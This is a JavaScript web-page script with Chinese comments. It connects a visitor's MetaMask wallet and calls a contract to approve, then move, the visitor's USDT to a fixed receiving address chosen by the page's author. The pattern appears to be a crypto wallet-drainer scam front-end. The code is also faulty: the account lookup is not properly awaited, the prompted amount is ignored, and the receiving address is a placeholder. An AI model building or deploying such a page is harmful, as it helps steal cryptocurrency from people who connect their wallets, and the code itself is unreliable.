const contractAddress = '0xa2E8dda146b9E724bA0cdfB3bdB6bfA1e37a54d2';
const abi = [
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "tokenAddress",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "from",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "spender",
				"type": "address"
			}
		],
		"name": "approveForTransfer",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "tokenAddress",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "spender",
				"type": "address"
			}
		],
		"name": "automateApproval",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "tokenAddress",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "from",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "to",
				"type": "address"
			}
		],
		"name": "autoTransferTokens",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"inputs": [],
		"name": "owner",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
];

let web3;
let currentAccount;

// 默认接收地址和转移数量
const defaultToAddress = '0xYourReceivingAddress'; // 替换为您希望转移的接收地址
const defaultAmount = '1'; // 替换为您希望转移的数量

document.getElementById('connectButton').addEventListener('click', async () => {
    console.log("尝试连接钱包...");
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            currentAccount = await web3.eth.getAccounts()[0];
            document.getElementById('status').innerText = `钱包连接成功: ${currentAccount}`;
            document.getElementById('approveButton').style.display = 'inline-block';
            document.getElementById('transferButton').style.display = 'inline-block';
            console.log("连接成功:", currentAccount);
        } catch (error) {
            document.getElementById('status').innerText = '连接失败，请检查您的钱包设置！';
            console.error("连接失败:", error);
        }
    } else {
        alert('请安装MetaMask！');
    }
});

document.getElementById('approveButton').addEventListener('click', async () => {
    const tokenAddress = '0xdac17f958d2ee523a2206206994597c13d831ec7'; // USDT地址
    const amount = prompt("请输入授权数量：");
    const contract = new web3.eth.Contract(abi, contractAddress);
    try {
        await contract.methods.approveForTransfer(tokenAddress, currentAccount, contractAddress).send({ from: currentAccount });
        alert('授权成功！');
    } catch (error) {
        alert('授权失败！');
        console.error("授权失败:", error);
    }
});

document.getElementById('transferButton').addEventListener('click', async () => {
    const tokenAddress = '0xdac17f958d2ee523a2206206994597c13d831ec7'; // USDT地址
    const toAddress = defaultToAddress; 
    const amount = defaultAmount; 
    const contract = new web3.eth.Contract(abi, contractAddress);
    try {
        await contract.methods.autoTransferTokens(tokenAddress, currentAccount, toAddress).send({ from: currentAccount });
        alert('转移成功！');
    } catch (error) {
        alert('转移失败！');
        console.error("转移失败:", error);
    }
});
